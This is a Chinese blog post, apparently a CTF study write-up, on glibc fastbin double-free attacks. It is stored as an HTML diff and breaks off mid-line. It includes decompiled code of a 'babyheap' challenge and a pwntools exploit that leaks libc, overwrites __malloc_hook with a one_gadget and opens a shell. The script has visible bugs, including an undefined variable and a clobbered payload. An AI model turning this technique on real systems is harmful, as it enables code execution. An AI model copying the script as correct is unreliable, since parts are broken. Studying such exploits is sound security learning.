@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Fastbin Attack原理：fastbin是单链表，当一个堆被释放到fastbin时，他会被插入到链表的头结点，但是不会释放size的p位，意思就是被释放了但是p仍然为1，这就对判断堆是否被释放带来了麻烦，而这一点就是我们要利用的漏洞 Fastbin Attack分为好几种攻击方式，下面来一一介绍 Fastbin Double Free如其名就是一个fast大小的堆被释放了两次 能成功的原因">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastbin Attack">
+<meta property="og:url" content="http://example.com/2021/11/17/Fastbin-Attack/index.html">
+<meta property="og:site_name" content="study">
+<meta property="og:description" content="Fastbin Attack原理：fastbin是单链表，当一个堆被释放到fastbin时，他会被插入到链表的头结点，但是不会释放size的p位，意思就是被释放了但是p仍然为1，这就对判断堆是否被释放带来了麻烦，而这一点就是我们要利用的漏洞 Fastbin Attack分为好几种攻击方式，下面来一一介绍 Fastbin Double Free如其名就是一个fast大小的堆被释放了两次 能成功的原因">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:/Users/张鹏/AppData/Roaming/Typora/typora-user-images/image-20211117151105924.png">
+<meta property="article:published_time" content="2021-11-17T09:18:02.000Z">
+<meta property="article:modified_time" content="2021-11-17T09:18:18.066Z">
+<meta property="article:author" content="rootzhang">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/张鹏/AppData/Roaming/Typora/typora-user-images/image-20211117151105924.png">
+
+<link rel="canonical" href="http://example.com/2021/11/17/Fastbin-Attack/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Fastbin Attack | study</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">study</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/17/Fastbin-Attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="rootzhang">
+      <meta itemprop="description" content="我的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="study">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Fastbin Attack
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-17 17:18:02 / 修改时间：17:18:18" itemprop="dateCreated datePublished" datetime="2021-11-17T17:18:02+08:00">2021-11-17</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h2><p>原理：fastbin是单链表，当一个堆被释放到fastbin时，他会被插入到链表的头结点，但是不会释放size的p位，意思就是被释放了但是p仍然为1，这就对判断堆是否被释放带来了麻烦，而这一点就是我们要利用的漏洞</p>
+<p>Fastbin Attack分为好几种攻击方式，下面来一一介绍</p>
+<h3 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h3><p>如其名就是一个fast大小的堆被释放了两次</p>
+<p>能成功的原因主要还是上面的原理，一个是p不会被置0，一个是fastbins判断堆是否空闲的机制，他只会检查头结点的堆是不是和要释放的是一个堆，如果是那就错误，如果不是，那就判断他不是空闲堆，插入头结点。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//利用姿势</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">mall0c(<span class="number">2</span>);</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>);</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>上面伪代码把1释放了两次，但是程序并不会报错，因为当第二次释放1时，他会检查要释放到的链表的头结点是不是1,此时头结点是2，不是1，那就判断1不是空闲堆，那就释放。</p>
+<p>最后的链表结构</p>
+<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20211117151105924.png" alt="image-20211117151105924"></p>
+<p>那free两次后能干啥呢，按我的理解就是让多个指针指向了同一个堆，可以实现就算堆是空闲也能写入数据（如果存在ufa就不用这个麻烦了）,最主要就是能覆盖fd了。能覆盖fd就能实现向任意地址申请堆了。</p>
+<p>下面是例题</p>
+<p>这道例题是我刚开始学pwn的时候做的，以前觉得这道题好难啊，现在看来好像没那么难理解了，这段时间的学习果然有用啊😁😁</p>
+<p>下面是伪代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_B70(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_CF4();</span><br><span class="line">    <span class="keyword">switch</span> ( sub_138C() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        sub_D48(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        sub_E7F(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        sub_F50(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        sub_1051(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_D48</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(<span class="number">24LL</span> * i + a1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      v2 = sub_138C();</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )</span><br><span class="line">          v2 = <span class="number">4096</span>;</span><br><span class="line">        v3 = <span class="built_in">calloc</span>(v2, <span class="number">1uLL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v3 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        *(_DWORD *)(<span class="number">24LL</span> * i + a1) = <span class="number">1</span>;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">8</span>) = v2;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">16</span>) = v3;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocate Index %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_E7F</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(<span class="number">24LL</span> * (<span class="keyword">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      result = sub_138C();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">        result = sub_11B2(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_F50</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(<span class="number">24LL</span> * (<span class="keyword">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(<span class="number">24LL</span> * v2 + a1) = <span class="number">0</span>;</span><br><span class="line">      *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>) = <span class="number">0LL</span>;</span><br><span class="line">      <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>));</span><br><span class="line">      result = <span class="number">24LL</span> * v2 + a1;</span><br><span class="line">      *(_QWORD *)(result + <span class="number">16</span>) = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_1051</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_DWORD *)(<span class="number">24LL</span> * result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      sub_130F(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>));</span><br><span class="line">      result = <span class="built_in">puts</span>(byte_14F1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Allocate&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. Fill&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. Free&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. Dump&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5. Exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Command: &quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>通过输出就可以知道这个程序的大致功能了，通过free可知没有ufa了。</p>
+<p>漏洞利用思路：</p>
+<p>​    1.暴露libc基地址，如果unsorted bin只有一个堆时，那这个堆的fd和bk都储存着main_arena+88地址，我们可以知道main_arena的偏移量，那就能知道libc基地址了。</p>
+<p>​    2.设置malloc_hook出的值为one_gadget,这是因为每次malloc的时候他都会检查malloc_hook处的值，如果为空那继续执行malloc,如果是一个地址的话，那就跳到这个地址处执行这里面的代码。</p>
+<p>因为没有ufa,所以得制造多个指针指向unsorted chunk才能在被释放时读到fd.就我目前知道的方式有两种，一种是double free(没必要)，一个是堆溢出直接改fd就行了，注意malloc分配bins上的堆时会检查申请的堆大小和要分配的堆大小是否相等，如果相等才可以分配。</p>
+<p>然后就是把堆分配到maolloc_hook附近，这个比较简单，主要是注意构造size，J就是在malloc_hook附近选择合适的size来fake chunk，不然不能通过分配。</p>
+<p>下面是payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    p = process(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: \n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>():</span></span><br><span class="line"><span class="comment">#    gdb.attach(p)</span></span><br><span class="line">    alloc(<span class="number">0x60</span>)</span><br><span class="line">    alloc(<span class="number">0x40</span>)</span><br><span class="line">    fill(<span class="number">0</span>, <span class="number">0x60</span> + <span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">    alloc(<span class="number">0x100</span>)</span><br><span class="line">    fill(<span class="number">2</span>, <span class="number">0x20</span>, <span class="string">&#x27;c&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    alloc(<span class="number">0x60</span>)</span><br><span class="line">    fill(<span class="number">1</span>, <span class="number">0x40</span> + <span class="number">0x10</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>))</span><br><span class="line">    alloc(<span class="number">0x50</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    leaked = u64(dump(<span class="number">1</span>)[-<span class="number">8</span>:])</span><br><span class="line">    <span class="comment"># return libc_base</span></span><br><span class="line">    <span class="keyword">return</span> leaked - <span class="number">0x3c4b78</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fastbin_attack</span>(<span class="params">libc_base</span>):</span></span><br><span class="line">    malloc_hook = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] + libc_base</span><br><span class="line">    execve_addr = <span class="number">0x4526a</span> + libc_base</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;malloc_hook @&quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">    log.info(<span class="string">&quot;system_addr @&quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(malloc_hook - <span class="number">27</span> - <span class="number">0x8</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    fill(<span class="number">0</span>, <span class="number">0x60</span> + <span class="number">0x10</span> + <span class="number">0x10</span>, payload)</span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x60</span>)</span><br><span class="line">    alloc(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    payload  = p8(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">    payload  = p64(execve_addr)</span><br><span class="line">    fill(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    alloc(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="comment">#    pwnlib.gdb.attach(p)</span></span><br><span class="line">    libc_base = leak()</span><br><span class="line">    log.info(<span class="string">&quot;get libc_base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    fastbin_attack(libc_base)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 